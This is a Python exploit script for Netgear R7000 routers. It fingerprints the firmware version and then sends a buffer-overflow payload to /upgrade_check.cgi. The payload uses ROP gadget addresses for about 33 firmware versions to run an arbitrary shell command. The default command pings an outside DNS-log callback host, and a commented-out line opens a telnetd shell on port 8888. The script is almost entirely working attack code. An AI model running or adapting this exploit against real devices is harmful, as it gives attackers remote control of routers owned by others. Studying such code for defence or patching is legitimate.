# -*- encoding:utf-8 -*-
import argparse
import socket
import struct
import sys
# from urlparse import urlparse
from urllib.parse import urlparse

address_info = {"R7000": {
    # 0) gadget: calls system($sp)
    "0.96": 0x2c990,
    "1.22": 0x2cc00,
    "2.16": 0x2cbec,
    "2.19": 0x2d04c,
    "3.24": 0x2d608,
    "3.56": 0x2d568,
    "3.60": 0x2de64,
    "3.68": 0x2d5c8,
    "3.80": 0x2d5c0,
    "4.18": 0x2ecac,
    "4.28": 0x2ecf4,
    "4.30": 0x2ed30,
    "5.64": 0x32520,
    "5.70": 0x32768,
    "7.2": 0x32768,
    "7.6": 0x329e8,
    "7.10": 0x32a44,
    "7.12": 0x36070,
    "8.34": 0x37528,
    "9.6": 0x3763C,
    "9.10": 0x3794C,
    "9.12": 0x3794C,
    "9.14": 0x37B08,
    "9.18": 0x37B14,
    "9.26": 0x37d1c,
    "9.28": 0x37dbc,
    "9.32": 0x38198,
    "9.34": 0x38174,
    "9.42": 0x38978,
    "9.60": 0x38FF4,
    "9.64": 0x3C3C4,
    "9.88": 0x3cfb4,
    "11.100": 0x3d000,
}}

firmware_version_to_human_version = {"R7000": {
    "V1.0.0.96_1.0.15": "0.96",
    "V1.0.1.22_1.0.15": "1.22",
    "V1.0.2.164_1.0.15": "2.16",
    "V1.0.2.194_1.0.15": "2.19",
    "V1.0.3.24_1.1.20": "3.24",
    "V1.0.3.56_1.1.25": "3.56",
    "V1.0.3.60_1.1.27": "3.60",
    "V1.0.3.68_1.1.31": "3.68",
    "V1.0.3.80_1.1.38": "3.80",
    "V1.0.4.18_1.1.52": "4.18",
    "V1.0.4.28_1.1.64": "4.28",
    "V1.0.4.30_1.1.67": "4.30",
    "V1.0.5.64_1.1.88": "5.64",
    "V1.0.5.70_1.1.91": "5.70",
    "V1.0.7.2_1.1.93": "7.2",
    "V1.0.7.6_1.1.99": "7.6",
    "V1.0.7.10_1.2.3": "7.10",
    "V1.0.7.12_1.2.5": "7.12",
    "V1.0.8.34_1.2.15": "8.34",
    "V1.0.9.6_1.2.19": "9.6",
    "V1.0.9.10_1.2.21": "9.10",
    "V1.0.9.12_1.2.23": "9.12",
    "V1.0.9.14_1.2.25": "9.14",
    "V1.0.9.18_1.2.27": "9.18",
    "V1.0.9.26_10.2.31": "9.26",
    "V1.0.9.28_10.2.32": "9.28",
    "V1.0.9.32_10.2.34": "9.32",
    "V1.0.9.34_10.2.36": "9.34",
    "V1.0.9.42_10.2.44": "9.42",
    "V1.0.9.60_10.2.60": "9.60",
    "V1.0.9.64_10.2.64": "9.64",
    "V1.0.9.88_10.2.88": "9.88",
    "V1.0.11.100_10.2.100": "11.100",
}}


def send_plain(ip, port, payload, keep_open):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(bytes(payload,encoding="utf-8"))
    if keep_open:
        return sock
    sock.close()


def send_ssl(ip, port, payload, keep_open):
    import ssl
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wrappedSocket = ssl.wrap_socket(sock)
    wrappedSocket.connect((ip, port))
    wrappedSocket.send(payload)
    if keep_open:
        return wrappedSocket
    wrappedSocket.close()


def send(ip, port, is_https, payload, keep_open=False):
    if is_https:
        return send_ssl(ip, port, payload, keep_open)
    else:
        return send_plain(ip, port, payload, keep_open)


def find_item(contents, start_string):
    start = contents.find(start_string)
    if (start == -1):
        print("Failed to automatically detect version.")
        sys.exit(1)

    start += len(start_string)
    end = contents.find("\r\n", start)
    return contents[start:end].upper()  # upper just in case


def p32(address, model):
    return struct.pack("<I", address)


def detect_model_version(ip, port, is_https):
    request = "GET /currentsetting.htm HTTP/1.1\r\nHost: {}\r\n\r\n".format(str(ip) + ':' + str(port))
    sock = send(ip, port, is_https, request, True)

    contents = ""
    while contents.find("InternetConnectionStatus") == -1 and contents.find("401 Unauthorized") == -1:
        contents += sock.recv(1)

    # Some older models/versions don't have the currentsetting.htm page, or it's protected by login
    if contents.find("401 Unauthorized") != -1:
        print("Version detection against this router is not possible using currentsetting.htm.")
        print("Received response:\n{}\n".format(contents))
        sys.exit(1)

    model = find_item(contents, "Model=")
    firmware_version = find_item(contents, "Firmware=")
    if model != "R7000":
        print("Unknown model: {}".format(model))
        sys.exit(1)

    if firmware_version not in firmware_version_to_human_version[model]:
        print("Unknown model and version: {} {}".format(model, firmware_version))
        sys.exit(1)

    return model, firmware_version_to_human_version[model][firmware_version]


def main(url, cmd):
    ip = urlparse(url).hostname
    port = urlparse(url).port
    scheme = urlparse(url).scheme
    is_https = False
    if scheme == "https":
        is_https = True
    model, version = detect_model_version(ip, port, is_https)

    if version not in address_info[model]:
        print("This exploit does not have a ROP gadget for the selected version ({}).".format(version))
        sys.exit(1)

    # Generate the payload
    rop_gadget = address_info[model][version]
    if type(rop_gadget) == list:
        rop_gadget = [p32(x, model) for x in rop_gadget]
    else:
        rop_gadget = p32(rop_gadget, model)

    data = ""
    data += "*#$^\x00"  # marker
    data += "\x00\x04\x00"  # size
    data += "A" * 0x60
    data += "B" * 0x4  # r4
    data += "C" * 0x4  # r5
    data += "D" * 0x4  # r6
    data += "E" * 0x4  # r7
    data += "F" * 0x4  # r8
    data += "G" * 0x4  # r9
    data += "H" * 0x4  # r10
    data += "I" * 0x4  # r11
    data += rop_gadget  # pc
    data += cmd + "\x00"  # Add the command and then NULL-terminate it
    data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

    # Some of the different models/versions use different names for the argument
    argument_name = "mtenFWUpload"

    payload = ''
    payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
    payload += 'Host: {}\r\n'.format(ip + ':' + str(port))
    payload += 'Content-Disposition: AAAA\r\n'
    payload += 'Content-Length: {}\r\n'.format(len(data))
    payload += 'Content-Type: application/octet-stream\r\n'
    payload += 'name="{}"\r\n'.format(argument_name)
    payload += '\r\n'
    payload += data

    send(ip, port, is_https, payload)

if __name__ == "__main__":
    url = "1.1.1.1"
    ip = urlparse(url).hostname
    port = urlparse(url).port
    scheme = urlparse(url).scheme
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target Host')
    parser.add_argument('-i', '--id', help='id')
    parser.add_argument('-s', '--server', default='127.0.0.1', help='dlserver')
    args = parser.parse_args()
    command = "ping -c 5 wgskid.dnslog.cn"
    # command = "telnetd -p 8888 /l /bin/sh"
    main(args.target, command)
